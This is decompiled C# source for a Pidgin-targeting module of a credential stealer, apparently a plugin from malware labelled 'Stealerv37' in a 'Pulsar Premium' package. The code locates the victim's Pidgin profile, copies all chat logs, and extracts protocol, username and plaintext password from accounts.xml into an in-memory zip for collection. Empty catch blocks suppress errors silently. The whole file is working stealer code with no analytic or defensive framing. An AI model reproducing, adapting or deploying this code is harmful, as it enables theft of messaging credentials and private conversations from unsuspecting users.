// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Messangers.Pidgin
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;
using System.Text;
using System.Xml;

#nullable disable
namespace Intelix.Targets.Messangers;

public class Pidgin : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string str = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple");
    if (!Directory.Exists(str))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Pidgin);
    this.CollectAccounts(zip, str, counterApplications);
    this.CollectLogs(zip, str, counterApplications);
    if (counterApplications.Files.Count <= 0)
      return;
    counterApplications.Files.Add("Pidgin\\");
    counter.Messangers.Add(counterApplications);
  }

  private void CollectLogs(
    InMemoryZip zip,
    string pidginRoot,
    Counter.CounterApplications counterApplications)
  {
    try
    {
      string str = Path.Combine(pidginRoot, "logs");
      if (!Directory.Exists(str))
        return;
      string targetEntryDirectory = Path.Combine(nameof (Pidgin), "chatlogs");
      zip.AddDirectoryFiles(str, targetEntryDirectory);
      counterApplications.Files.Add($"{str} => {targetEntryDirectory}");
    }
    catch
    {
    }
  }

  private void CollectAccounts(
    InMemoryZip zip,
    string pidginRoot,
    Counter.CounterApplications counterApplications)
  {
    try
    {
      string path = Path.Combine(pidginRoot, "accounts.xml");
      if (!File.Exists(path))
        return;
      StringBuilder stringBuilder = new StringBuilder();
      XmlDocument xmlDocument = new XmlDocument();
      string inputUri = path;
      using (XmlReader reader = XmlReader.Create(inputUri, new XmlReaderSettings()
      {
        IgnoreComments = true,
        IgnoreWhitespace = true
      }))
        xmlDocument.Load(reader);
      XmlElement documentElement = xmlDocument.DocumentElement;
      if (documentElement == null)
        return;
      foreach (XmlNode childNode1 in documentElement.ChildNodes)
      {
        if (childNode1.ChildNodes.Count >= 3)
        {
          XmlNode childNode2 = childNode1.ChildNodes[0];
          XmlNode childNode3 = childNode1.ChildNodes[1];
          XmlNode childNode4 = childNode1.ChildNodes[2];
          string innerText1 = childNode2?.InnerText;
          string innerText2 = childNode3?.InnerText;
          string innerText3 = childNode4?.InnerText;
          if (!string.IsNullOrEmpty(innerText1) && !string.IsNullOrEmpty(innerText2) && !string.IsNullOrEmpty(innerText3))
          {
            stringBuilder.AppendLine("Protocol: " + innerText1);
            stringBuilder.AppendLine("Username: " + innerText2);
            stringBuilder.AppendLine("Password: " + innerText3);
            stringBuilder.AppendLine();
          }
        }
      }
      if (stringBuilder.Length == 0)
        return;
      string entryPath = Path.Combine(nameof (Pidgin), "accounts.txt");
      zip.AddTextFile(entryPath, stringBuilder.ToString());
      counterApplications.Files.Add($"{path} => {entryPath}");
    }
    catch
    {
    }
  }
}
